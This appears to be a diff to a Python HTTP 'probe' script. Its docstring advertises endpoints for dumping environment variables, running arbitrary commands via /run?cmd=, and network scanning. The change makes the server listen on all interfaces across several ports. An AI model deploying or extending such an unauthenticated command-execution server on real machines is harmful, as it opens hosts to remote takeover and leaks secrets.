@@ -1,5 +1,5 @@
 #!/usr/bin/env python3
-import struct
+import struct, time
 """i52733 probe v2: lazy probes; serve immediately; GET /env, /run?cmd=, /scan."""
 import os, json, socket, urllib.request, ssl, subprocess, threading, queue, re
 
@@ -158,7 +158,21 @@ class H(http.server.BaseHTTPRequestHandler):
                 pass
 
 if __name__ == "__main__":
-    port = int(os.environ.get("PORT", "8080"))
-    srv = http.server.ThreadingHTTPServer(("0.0.0.0", port), H)
-    print("i52733 probe v2 listening on", port, flush=True)
-    srv.serve_forever()
+    ports = set()
+    for k in ("PORT",):
+        v = os.environ.get(k)
+        if v and v.isdigit():
+            ports.add(int(v))
+    ports.update({3000, 8080})
+    print("i52733 probe v3 listening on", sorted(ports), flush=True)
+    servers = []
+    for p in ports:
+        try:
+            srv = http.server.ThreadingHTTPServer(("0.0.0.0", p), H)
+            threading.Thread(target=srv.serve_forever, daemon=True).start()
+            servers.append((p, srv))
+            print("bound", p, flush=True)
+        except Exception as e:
+            print("bind fail", p, e, flush=True)
+    while True:
+        time.sleep(3600)
